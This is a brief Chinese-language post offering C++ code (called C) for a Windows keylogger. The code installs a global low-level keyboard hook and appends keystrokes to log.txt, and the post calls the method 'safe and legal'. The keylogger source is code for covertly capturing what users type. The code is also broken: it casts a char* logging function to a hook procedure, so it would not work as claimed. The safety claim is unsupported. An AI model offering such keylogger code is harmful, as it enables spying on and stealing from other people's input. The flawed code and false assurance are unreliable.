假设您需要在 windows 平台上，安全的方式记录 windows 计算机上的键盘输入，下面是一段例子 C 语言实现。
```c
#include <Windows.h>
#include <iostream>
#include <fstream>

#define MAX_KEYSTR_LENGTH 256

std::ofstream out("log.txt", std::ios::app);

void LogKeyStroke(char* key) {
    out << key;
}

int main() {
    HKL hkl = GetKeyboardLayout(0);

    if (!hkl) {
        std::cerr << "Failed to get keyboard layout." << std::endl;
        return 1;
    }

    // Set hook
    HHOOK hhk = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LogKeyStroke, NULL, 0);

    if (!hhk) {
        std::cerr << "Failed to set hook." << std::endl;
        return 1;
    }

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook
    UnhookWindowsHookEx(hhk);

    return 0;
}
```

请注意，这个例子展示了在 windows 平台上安全、合法的捕获键盘输入的方法。它使用 Windows API 来注册一个低级别键盘钩子来捕获键盘输入。  
